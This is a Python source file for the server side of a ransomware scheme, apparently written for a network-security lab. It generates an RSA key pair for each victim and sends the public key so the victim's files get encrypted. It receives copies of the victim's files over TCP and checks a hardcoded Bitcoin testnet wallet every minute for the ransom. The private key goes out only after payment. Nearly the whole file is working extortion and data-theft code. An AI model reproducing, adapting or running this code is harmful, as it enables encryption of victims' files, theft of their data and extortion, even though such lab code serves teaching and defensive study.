#!/usr/bin/env python3

""" Implementation of the server that sends some malicious code to its
    victim.
"""

import base64
import logging
import socket
import os
import errno
import time
from getmac import get_mac_address
import cryptowallet
import rsa
import shutil
import requests
import re

class Server:
    """ This class represents a server that stores some launches attack once the connection 
    between server and victim is established.
    """
   
    # Format of encoding for the messages and files sent over the TCP connection
    FORMAT = 'utf-8'
    # IP address of the server
    IP_ADDR = '10.0.2.5'
    # The buffer size when receiving the data
    MAX_SIZE = 4096
    # A list of victims connected to the server
    VICTIMS = []
    # Working directory of the server to store victim's files
    WORKING_DIR = '/home/netsec/server'
    CODE_PATH = '/home/netsec/server/mal.py'
    # Flag to indicate whether all the files have been transferred over
    TRANSFER_DONE = False

    global initial_balance, WALLET_ADDRESS, bitcoin_needed 
    WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
    bitcoin_needed = 0 #Instantiate how much bitcoin is needed
    initial_balance = 0

    def __init__(self, port):
        """Once the object of the class has been made, the port number and TCP connection will be initialized"""
        self._port = port
        # Initialize the socket for connection using TCP protocol
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._transfer_done = False

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        """ Sets the port the server listens to into {new_port}"""
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before the session. """
        try:
            # Binds the server to the port and listens to the port.
            self.socket.bind((Server.IP_ADDR, self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')


    def get_balance(self, wallet_address):
        """Retrieves the balance of the crypto wallet using the URL."""
        # API endpoint URL for retrieving wallet balance from blockchain.com API
        balance_url = "https://live.blockcypher.com/btc-testnet/address/" + wallet_address
        decimal_pattern = r'\d+\.\d+'


        # Make API request to retrieve wallet balance
        response = requests.get(balance_url)
        if response.status_code == 200:
            response_text = response.text
            index =  response_text.find("balance of")
            balance_str = response_text[index+11:index + 20]
            match = re.search(decimal_pattern, balance_str)
            balance = float(match.group())
        return balance
    
    def make_dir(self, dir_name):
        """Creates a directory on the server side to store victim's files."""
        path = os.path.join(Server.WORKING_DIR, dir_name)
        os.mkdir(path)

    def generate_key_pair(self, vpath):
        """Generates the private and public keys to be used to encrypt and decrpyt files."""
        public_key, private_key = rsa.newkeys(2048)

        with open(os.path.join(vpath , 'public_key.pem'), 'wb') as f:
            f.write(public_key.save_pkcs1('PEM'))

        with open(os.path.join(vpath, 'private_key.pem'), 'wb') as f:
            f.write(private_key.save_pkcs1('PEM'))

    def receive_victim_files(self, conn, mac):
        """Receives victim's files over a TCP connection."""
        path = os.path.join(Server.WORKING_DIR, mac)   
        data = conn.recv(Server.MAX_SIZE)
        filename = base64.b64decode(data).decode(Server.FORMAT)
        data_file = ""
        size = 0

        # Message that indicates all the files have been transferred.
        if "DONE." in str(filename):
            self.TRANSFER_DONE = True

            return
        
        # Create a blank file using the filename sent by the victim and write the content in it.
        file_loc = os.path.join(path, filename)
        file = open(file_loc, "w")
        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
        while "FILEDONE" not in data_file :
            data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT, errors="ignore")
            file.write(data_file)
            conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
            size+=len(data_file)

        print('Received: '+filename)
        conn.sendall(base64.b64encode("FILEDONE RECEIVED".encode(Server.FORMAT)))

        file.close() 


    def check_if_user_paid(self, initial_bal):
        """Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null."""
        current_balance = self.get_balance(WALLET_ADDRESS)
        change = current_balance - initial_bal
        
        print('Payment has been made: '+ str(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001))

        # Checks whether the payment has been made.
        if (change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001):
            return True
        else:
            global initial_balance
            initial_balance = current_balance
            return False
    
    def remove_victim_files_from_server(self, mac):
        """Removes the victims files from the server once payment has been made."""
        path = os.path.join(Server.WORKING_DIR, mac)
        shutil.rmtree(path)
        print("All files in the victim directory has been deleted")

    def attack(self):
        """Launches the attack by sending over the public key to the victim to encrypt all the files."""
        # Establish a connection with the client.
        while True:
            connection, address = self.socket.accept()
            with connection:

                # Gets the MAC address of the victim and use it as the directory name
                victim_mac = get_mac_address(ip=address[0])

                victim_dir = os.path.join(Server.WORKING_DIR, victim_mac)

                if victim_mac not in Server.VICTIMS:
                    Server.VICTIMS.append(victim_mac)
                    try:
                        self.make_dir(victim_mac)
                    except OSError as e:
                        if e.errno == errno.EEXIST:
                            print('Directory not created')
                        else:
                            raise

                    self.generate_key_pair(victim_dir)
                    
                    # Sends over the public key filename and its content to the victim.
                    key_name = base64.b64encode('public_key.pem'.encode(Server.FORMAT))
                    connection.sendall(key_name)
                    msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)

                    file = open(os.path.join(victim_dir, 'public_key.pem'), "rb")
                    key_data = file.read()
                    key = base64.b64encode(key_data)
                    connection.sendall(key)
                    msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)

                    # Waits until all the files have been received and receive the bitcoin amount from the victim
                    while(True):
                        self.receive_victim_files(connection, victim_mac)
                        if self.TRANSFER_DONE == True:
                            print("All files have been received")
                            #Receive the amount of bitcoin needed
                            global bitcoin_needed
                            bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
                            break
                    
                while (True):
                    #Every  60 seconds check if victim paid, if they did send them a message
                    time.sleep(60)

                    if(self.check_if_user_paid(initial_balance)):
                        # sends decryption key  (victim is also simultaneously checking if paid and if they have it recives the things below)
                        """ Opening and reading the private key file. """
                        key_path = os.path.join(victim_dir, 'private_key.pem')

                        priv_key = open(key_path, "rb")
                        data = priv_key.read()

                        """ Sending the filename to the server. """
                        connection.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
                        print("Sent private key")
                        msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)

                        """ Sending the file data to the server. """
                        connection.sendall(base64.b64encode(data))
                        msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)

                        """ Closing the file. """
                        file.close()  

                        # Waits until the private key has been fully received before deleting victims files
                        while True:
                            msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                            """ Deleting the victim file from server when the signal x is received. """
                            if msg == 'x':
                                self.remove_victim_files_from_server(victim_mac)
                                break
                            break
                        break
                    
                    
if __name__ == '__main__':
    # Create and initialize a server running on attacker's side.
    # It takes the port number 27000 (permanent) and will listen to this port.
    server = Server(27000)
    server.initialize()
    # Send a payload to the dropper client once it establishes a connection.
    server.attack()
